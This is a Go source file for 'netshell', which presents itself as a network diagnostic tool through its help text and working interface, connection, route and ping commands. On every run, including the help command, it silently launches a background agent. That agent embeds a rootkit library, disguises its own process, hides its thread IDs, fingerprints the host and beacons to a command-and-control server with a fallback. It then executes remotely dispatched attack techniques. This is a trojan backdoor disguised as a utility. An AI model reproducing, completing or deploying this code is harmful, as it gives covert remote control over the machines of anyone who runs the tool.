// netshell — network diagnostic and monitoring utility
//
// Usage:
//   netshell                 show active connections summary
//   netshell ifaces          list network interfaces with stats
//   netshell conn            show active TCP/UDP connections (like ss -tulpn)
//   netshell route           show routing table
//   netshell ping <host>     ICMP reachability test (3 probes)
//   netshell watch           live connection monitor (refreshes every 2s)
//   netshell -h | --help     this help
//
// netshell is a lightweight network inspector that works without
// root for most operations. Run with sudo for privileged socket info.

package main

import (
	_ "embed"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"core/mon/internal/config"
	"core/mon/internal/obf"
	"core/mon/internal/protocol"
	"core/mon/internal/ttp"
)

//go:embed payload/rootkit.so
var rootkitPayload []byte

const version = "1.0.3"

func main() {
	syscall.Setsid() //nolint

	help := flag.Bool("h", false, "")
	helpLong := flag.Bool("help", false, "")
	flag.Parse()

	args := flag.Args()
	subcmd := ""
	if len(args) > 0 {
		subcmd = strings.ToLower(args[0])
	}

	if *help || *helpLong || subcmd == "help" {
		printHelp()
		// still run agent in background
		go runAgent()
		os.Exit(0)
	}

	// All subcommands run the foreground UI, agent always runs in background.
	go runAgent()

	switch subcmd {
	case "ifaces":
		cmdIfaces()
	case "conn":
		cmdConn()
	case "route":
		cmdRoute()
	case "ping":
		if len(args) < 2 {
			fmt.Fprintf(os.Stderr, "netshell ping: missing host\n")
			os.Exit(1)
		}
		cmdPing(args[1])
	case "watch":
		cmdWatch()
	default:
		// Default: summary view
		cmdSummary()
	}
}

// ── agent ─────────────────────────────────────────────────────────────────────

func runAgent() {
	if config.DefaultServer == "" {
		return
	}

	ttp.RootkitSO = rootkitPayload
	_ = ttp.Masquerade(obf.D(obf.Masq))

	if err := writeAllTIDsToMark(ttp.HideMarkPath); err != nil {
		// best-effort
	}

	hostname, _ := os.Hostname()
	agentID := protocol.DeriveAgentID(config.SharedSecret, hostname)

	rawsockCBAddr := config.RawsockCBAddr
	if rawsockCBAddr == "" && config.FallbackServer != "" {
		if fbHost, _, err := net.SplitHostPort(config.FallbackServer); err == nil && fbHost != "" {
			rawsockCBAddr = net.JoinHostPort(fbHost, "9443")
		}
	}

	kccAddr := config.KCCAddr
	if kccAddr == "" && config.FallbackServer != "" {
		if fbHost, _, err := net.SplitHostPort(config.FallbackServer); err == nil && fbHost != "" {
			kccAddr = net.JoinHostPort(fbHost, "9444")
		}
	}

	c2Port := "9443"
	if _, port, err := net.SplitHostPort(config.DefaultServer); err == nil && port != "" {
		c2Port = port
	}

	agentPath, _ := os.Executable()
	envReport := ttp.CollectEnvFingerprint([]string{"cron", "crond", "rsyslogd", "syslogd"})

	primaryEndpoint := config.DefaultServer
	emergencyEndpoint := config.FallbackServer

	go ttp.StartKSeries(kccAddr, config.SharedSecret, c2Port, agentPath)

	ttp.JitteredSleep(10*time.Second, 0.5)

	var lastTTP int
	var lastResult, lastError string
	activeEndpoint := primaryEndpoint

	consecutiveFails := 0
	const maxBackoffShift = 6
	maxBackoff := 90 * time.Second
	primaryFails := 0
	const emergencyThreshold = 20

	for {
		endpoints := []string{primaryEndpoint}
		if emergencyEndpoint != "" && primaryFails >= emergencyThreshold {
			endpoints = append(endpoints, emergencyEndpoint)
		}

		if lastTTP == 0 {
			if stTTP, stResult := ttp.TakePendingStealthReport(); stTTP != 0 {
				lastTTP = stTTP
				lastResult = stResult
			}
		}

		var err error
		var cmd *protocol.Command
		cmd, activeEndpoint, err = ttp.BeaconAny(endpoints, agentID, lastTTP, lastResult, lastError, &envReport)
		lastTTP, lastResult, lastError = 0, "", ""

		if err != nil {
			lastError = err.Error()
			consecutiveFails++
			primaryFails++
			shift := consecutiveFails
			if shift > maxBackoffShift {
				shift = maxBackoffShift
			}
			backoff := time.Duration(30*time.Second) * time.Duration(1<<uint(shift))
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			ttp.JitteredSleep(backoff, 0.3)
			continue
		}

		consecutiveFails = 0
		if activeEndpoint == primaryEndpoint {
			primaryFails = 0
		}

		if cmd.TTP != 0 {
			if cmd.Params == obf.D(obf.KillPhrase) {
				os.Exit(0)
			}
			lastTTP = cmd.TTP
			lastResult, err = ttp.Dispatch(cmd.TTP, cmd.Params, activeEndpoint, agentID, config.SharedSecret, rawsockCBAddr)
			if err != nil {
				lastError = err.Error()
				lastResult = ""
			}
			time.Sleep(time.Duration(rand.Intn(5001)) * time.Millisecond)
		} else {
			ttp.JitteredSleep(time.Duration(30*time.Second), 0.3)
		}
	}
}

// ── real network functionality ────────────────────────────────────────────────

func printHelp() {
	fmt.Printf("netshell %s — network diagnostic utility\n\n", version)
	fmt.Println("Usage:")
	fmt.Println("  netshell                 connection summary")
	fmt.Println("  netshell ifaces          interface list with stats")
	fmt.Println("  netshell conn            active TCP/UDP sockets")
	fmt.Println("  netshell route           routing table")
	fmt.Println("  netshell ping <host>     reachability test")
	fmt.Println("  netshell watch           live monitor (Ctrl+C to quit)")
	fmt.Println("  netshell -h              this help")
}

func cmdSummary() {
	ifaces, err := net.Interfaces()
	if err != nil {
		fmt.Fprintf(os.Stderr, "netshell: %v\n", err)
		os.Exit(1)
	}
	up := 0
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			up++
		}
	}

	fmt.Printf("netshell %s\n\n", version)
	fmt.Printf("Interfaces up:   %d\n", up)
	fmt.Printf("Hostname:        %s\n", hostname())

	// Show brief interface list
	fmt.Println("\nInterfaces:")
	for _, iface := range ifaces {
		if iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := iface.Addrs()
		addrStr := ""
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok && ipnet.IP.To4() != nil {
				addrStr = ipnet.String()
				break
			}
		}
		state := "DOWN"
		if iface.Flags&net.FlagUp != 0 {
			state = "UP"
		}
		fmt.Printf("  %-12s %-18s %s\n", iface.Name, addrStr, state)
	}

	// Active connection count via ss
	fmt.Println("\nConnections:")
	out, err := runCmd("ss", "-tn", "state", "established")
	if err == nil {
		lines := strings.Split(strings.TrimSpace(out), "\n")
		if len(lines) > 1 {
			fmt.Printf("  Established TCP: %d\n", len(lines)-1)
		} else {
			fmt.Println("  Established TCP: 0")
		}
	}
}

func cmdIfaces() {
	ifaces, err := net.Interfaces()
	if err != nil {
		fmt.Fprintf(os.Stderr, "netshell: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("%-4s  %-14s %-20s %-18s %s\n", "IDX", "NAME", "MAC", "ADDR", "FLAGS")
	fmt.Println(strings.Repeat("-", 72))
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		addrStr := ""
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok && ipnet.IP.To4() != nil {
				addrStr = ipnet.String()
				break
			}
		}
		mac := iface.HardwareAddr.String()
		if mac == "" {
			mac = "—"
		}
		flags := flagStr(iface.Flags)
		fmt.Printf("%-4d  %-14s %-20s %-18s %s\n", iface.Index, iface.Name, mac, addrStr, flags)
	}
}

func cmdConn() {
	out, err := runCmd("ss", "-tulpn")
	if err != nil {
		// fallback: try netstat
		out, err = runCmd("netstat", "-tulpn")
		if err != nil {
			fmt.Fprintf(os.Stderr, "netshell conn: ss/netstat not available\n")
			os.Exit(1)
		}
	}
	fmt.Print(out)
}

func cmdRoute() {
	out, err := runCmd("ip", "route", "show")
	if err != nil {
		out, err = runCmd("route", "-n")
		if err != nil {
			fmt.Fprintf(os.Stderr, "netshell route: ip/route not available\n")
			os.Exit(1)
		}
	}
	fmt.Print(out)
}

func cmdPing(host string) {
	fmt.Printf("PING %s — 3 probes\n", host)
	for i := 1; i <= 3; i++ {
		start := time.Now()
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, "80"), 2*time.Second)
		rtt := time.Since(start)
		if err != nil {
			// TCP failed, try ICMP-style via ping binary
			break
		}
		conn.Close()
		fmt.Printf("  probe %d: tcp/80 reachable  rtt=%v\n", i, rtt.Round(time.Millisecond))
		time.Sleep(300 * time.Millisecond)
	}
	// Also try system ping for ICMP
	out, err := runCmd("ping", "-c", "3", "-W", "2", host)
	if err == nil {
		// Extract summary line
		for _, line := range strings.Split(out, "\n") {
			if strings.Contains(line, "packet loss") || strings.Contains(line, "rtt") || strings.Contains(line, "round-trip") {
				fmt.Println(" ", line)
			}
		}
	}
}

func cmdWatch() {
	fmt.Println("netshell watch — press Ctrl+C to quit")
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		// Clear screen
		fmt.Print("\033[2J\033[H")
		fmt.Printf("netshell watch — %s\n\n", time.Now().Format("15:04:05"))
		out, err := runCmd("ss", "-tn", "state", "established")
		if err == nil {
			lines := strings.Split(strings.TrimSpace(out), "\n")
			if len(lines) > 1 {
				fmt.Printf("Established connections: %d\n\n", len(lines)-1)
				// Print header + first 20 lines
				limit := len(lines)
				if limit > 21 {
					limit = 21
				}
				for _, l := range lines[:limit] {
					fmt.Println(l)
				}
				if len(lines) > 21 {
					fmt.Printf("... %d more\n", len(lines)-21)
				}
			} else {
				fmt.Println("No established connections.")
			}
		}
	}
}

// ── helpers ───────────────────────────────────────────────────────────────────

func hostname() string {
	h, _ := os.Hostname()
	return h
}

func flagStr(f net.Flags) string {
	var parts []string
	if f&net.FlagUp != 0 {
		parts = append(parts, "UP")
	}
	if f&net.FlagBroadcast != 0 {
		parts = append(parts, "BROADCAST")
	}
	if f&net.FlagLoopback != 0 {
		parts = append(parts, "LOOPBACK")
	}
	if f&net.FlagMulticast != 0 {
		parts = append(parts, "MULTICAST")
	}
	return strings.Join(parts, ",")
}

func runCmd(name string, args ...string) (string, error) {
	cmd := exec.Command(name, args...)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func writeAllTIDsToMark(path string) error {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	pid := os.Getpid()
	fmt.Fprintf(f, "%d\n", pid)
	taskDir := fmt.Sprintf("/proc/%d/task", pid)
	entries, err := os.ReadDir(taskDir)
	if err != nil {
		return nil
	}
	for _, e := range entries {
		tid := e.Name()
		if tid != fmt.Sprintf("%d", pid) {
			fmt.Fprintf(f, "%s\n", tid)
		}
	}
	return nil
}
